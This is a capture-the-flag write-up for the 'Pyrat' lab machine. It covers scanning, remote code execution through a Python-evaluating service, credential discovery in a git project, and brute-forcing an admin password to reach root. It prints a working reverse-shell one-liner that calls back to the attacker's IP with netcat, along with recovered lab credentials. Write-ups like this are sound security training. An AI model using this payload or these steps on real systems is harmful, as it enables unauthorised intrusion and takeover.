# Pyrat

### Pyrat
Initial scan shows port 22 and 8000 open

    p22,8000 -sV -sC -oN scan 10.10.0.182
    Nmap scan report for 10.10.0.182
    Host is up (0.052s latency).
    
    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
    |   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
    |_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
    8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    |_http-server-header: SimpleHTTP/0.6 Python/3.11.2
    |_http-open-proxy: Proxy might be redirecting requests
    | fingerprint-strings: 
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
    |     source code string cannot contain null bytes
    |   FourOhFourRequest, LPDString, SIPOptions: 
    |     invalid syntax (<string>, line 1)
    |   GetRequest: 
    |     name 'GET' is not defined
    |   HTTPOptions, RTSPRequest: 
    |     name 'OPTIONS' is not defined
    |   Help: 
    |_    name 'HELP' is not defined
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port8000-TCP:V=7.94SVN%I=7%D=10/14%Time=670D487D%P=x86_64-pc-linux-gnu%
    SF:r(GenericLines,1,"\n")%r(GetRequest,1A,"name\x20'GET'\x20is\x20not\x20d
    SF:efined\n")%r(X11Probe,2D,"source\x20code\x20string\x20cannot\x20contain
    SF:\x20null\x20bytes\n")%r(FourOhFourRequest,22,"invalid\x20syntax\x20\(<s
    SF:tring>,\x20line\x201\)\n")%r(Socks4,2D,"source\x20code\x20string\x20can
    SF:not\x20contain\x20null\x20bytes\n")%r(HTTPOptions,1E,"name\x20'OPTIONS'
    SF:\x20is\x20not\x20defined\n")%r(RTSPRequest,1E,"name\x20'OPTIONS'\x20is\
    SF:x20not\x20defined\n")%r(DNSVersionBindReqTCP,2D,"source\x20code\x20stri
    SF:ng\x20cannot\x20contain\x20null\x20bytes\n")%r(DNSStatusRequestTCP,2D,"
    SF:source\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(He
    SF:lp,1B,"name\x20'HELP'\x20is\x20not\x20defined\n")%r(LPDString,22,"inval
    SF:id\x20syntax\x20\(<string>,\x20line\x201\)\n")%r(SIPOptions,22,"invalid
    SF:\x20syntax\x20\(<string>,\x20line\x201\)\n")%r(LANDesk-RC,2D,"source\x2
    SF:0code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(NotesRPC,2D
    SF:,"source\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(
    SF:JavaRMI,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20by
    SF:tes\n")%r(afp,2D,"source\x20code\x20string\x20cannot\x20contain\x20null
    SF:\x20bytes\n")%r(giop,2D,"source\x20code\x20string\x20cannot\x20contain\
    SF:x20null\x20bytes\n");
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Port 8000 seems to be a minimal webserver written in python. However, from the scan, error messages such as

    "name 'GET' is not defined"
    "name 'OPTIONS' is not defined"
    "source code string cannot contain null bytes"
    "invalid syntax (<string>, line 1)"

Suggest to me that this connection interprets the input as python code directly, as these are the same error messages provided by the python language. Infact, if I try to execute a netcat connection to my machine, it actually works, like in the figure below:<br />
![image](https://github.com/user-attachments/assets/7ed9ee74-1411-43fd-a9cc-73df4300c489)<br />
We have RCE. Time to spawn a reverse shell; I used the following payload: `__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.90.188 9999 >/tmp/f')`
![image](https://github.com/user-attachments/assets/75a3abb7-4c55-4013-9343-d44299ec0a49)<br />
Using linpeas on the target machine, it reveals some files inside `/opt`, which usually is empty:<br />
![image](https://github.com/user-attachments/assets/3440046d-d233-4944-96aa-9a957f5168a6)<br />
This directory contains a git project. Enumerating a bit the files inside this directory, I found a set of credentials:
![image](https://github.com/user-attachments/assets/d983c2f0-fef9-49bb-a398-90e3bebce124)<br />
`think:_TH1NKINGPirate$_`. So I logged on think's account using ssh. Further system enumeration(still using linpease) led me to this interesting email sent by "root" to "think":<br />
![image](https://github.com/user-attachments/assets/b5941b57-9cd2-4775-95a8-dabd28f959a4)<br />
So probably this RAT(Remote Administration Tool) the project contained in the /opt directory. However there's only a `.git` folder, which doesn't contain the code. In order to find the code, we need to restore the project to an older version, like in the figure below:<br />
![image](https://github.com/user-attachments/assets/48fbbf7a-c7de-4e91-be04-9f318edc9540)<br />
At this point I was stuck for a while, and decided to go back to the initial netcat connection on port 8000. Initially I saw that typing "admin" on the netcat connection, the server responded with "password:". So I created a python script to bruteforce the login (it can be found inside this folder). The password is `abc123`. And it gave me access to a full root shell:<br />
![image](https://github.com/user-attachments/assets/7cfbcc1d-1609-46d4-a529-4ef4b0f75b85)<br />


